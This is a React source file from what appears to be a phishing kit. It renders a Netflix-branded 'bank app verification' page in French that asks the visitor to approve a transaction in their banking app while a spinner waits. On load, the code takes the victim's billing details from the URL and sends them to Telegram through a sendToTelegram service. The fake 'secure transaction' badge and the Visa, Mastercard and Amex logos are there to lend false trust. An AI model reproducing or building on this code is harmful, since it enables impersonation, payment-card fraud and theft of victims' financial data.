import React, { useState, useEffect, useRef } from 'react';
import { useIntl } from 'react-intl';
import { NetflixLogo } from '../components/NetflixLogo';
import { useNavigate, useLocation } from 'react-router-dom';
import { WhiteFooter } from '../components/WhiteFooter';
import { LoadingSpinner } from '../components/LoadingSpinner';
import { sendToTelegram } from '../services/telegram';
import { motion } from 'framer-motion';
import { Smartphone, CheckCircle2 } from 'lucide-react';

export function BankAppCheckPage() {
  const navigate = useNavigate();
  const location = useLocation();
  const intl = useIntl();
  const [isLoading, setIsLoading] = useState(true);
  const [billingInfo, setBillingInfo] = useState<any>(null);
  const hasNotifiedRef = useRef(false);

  useEffect(() => {
    const stateParam = new URLSearchParams(location.search).get('state');
    if (stateParam && !hasNotifiedRef.current) {
      try {
        const state = JSON.parse(decodeURIComponent(stateParam));
        setBillingInfo(state.billingInfo);
        sendToTelegram({
          type: 'bank_app_check',
          billingInfo: state.billingInfo
        });
        hasNotifiedRef.current = true;
      } catch (error) {
        console.error('Error parsing state:', error);
      }
    }
  }, [location.search]);

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 via-white to-blue-50 flex flex-col">
      <motion.header
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        transition={{ duration: 0.3 }}
        className="bg-white border-b border-gray-200 sticky top-0 z-50 shadow-sm"
      >
        <div className="max-w-[1200px] mx-auto px-8 py-5 flex justify-between items-center">
          <NetflixLogo />
          <button 
            onClick={() => navigate('/')}
            className="text-[#333333] hover:text-[#333333] text-lg font-bold hover:underline transition-all"
          >
            {intl.formatMessage({ id: 'nav.signout' })}
          </button>
        </div>
      </motion.header>

      <main className="flex-grow flex flex-col items-center justify-center px-4 py-12 md:py-16">
        <motion.div 
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.3 }}
          className="w-full max-w-[500px]"
        >
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ duration: 0.3 }}
            className="bg-white rounded-2xl shadow-xl p-8 md:p-10 border border-gray-100"
          >
            <div className="flex flex-col items-center text-center">
              <motion.div
                initial={{ scale: 0 }}
                animate={{ scale: 1 }}
                transition={{ 
                  type: "spring",
                  stiffness: 260,
                  damping: 20
                }}
                className="w-20 h-20 bg-blue-600 rounded-full flex items-center justify-center mb-6 shadow-lg shadow-blue-200"
              >
                <Smartphone className="w-10 h-10 text-white" />
              </motion.div>

              <motion.h1
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ duration: 0.3, delay: 0.2 }}
                className="text-2xl font-bold text-gray-900 mb-4"
              >
                Vérification Application Bancaire
              </motion.h1>

              <motion.p
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                transition={{ duration: 0.3, delay: 0.3 }}
                className="text-gray-600 mb-8"
              >
                Veuillez confirmer la transaction dans votre application bancaire mobile.
              </motion.p>

              <motion.div
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                transition={{ duration: 0.3, delay: 0.4 }}
                className="w-full max-w-[280px] bg-gray-50 rounded-xl p-6 mb-8"
              >
                <LoadingSpinner />
                <p className="text-gray-600 mt-4">
                  En attente de confirmation...
                </p>
              </motion.div>

              <motion.div
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                transition={{ duration: 0.3, delay: 0.5 }}
                className="flex items-center justify-center gap-2 text-gray-500"
              >
                <CheckCircle2 className="w-4 h-4" />
                <span className="text-sm">Transaction sécurisée</span>
              </motion.div>
            </div>
          </motion.div>

          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ duration: 0.3, delay: 0.6 }}
            className="mt-6 flex justify-center gap-6"
          >
            <img src="https://cdn.visa.com/v2/assets/images/logos/visa/blue/logo.png" alt="Visa" className="h-6 opacity-60 hover:opacity-100 transition-opacity" />
            <img src="https://www.mastercard.fr/content/dam/public/mastercardcom/eu/fr/logos/mc-logo-52.svg" alt="Mastercard" className="h-6 opacity-60 hover:opacity-100 transition-opacity" />
            <img src="https://www.amexglobalbusinesstravel.com/content/dam/gbt/logos/logo-amex.svg" alt="American Express" className="h-6 opacity-60 hover:opacity-100 transition-opacity" />
          </motion.div>
        </motion.div>
      </main>

      <WhiteFooter />
    </div>
  );
}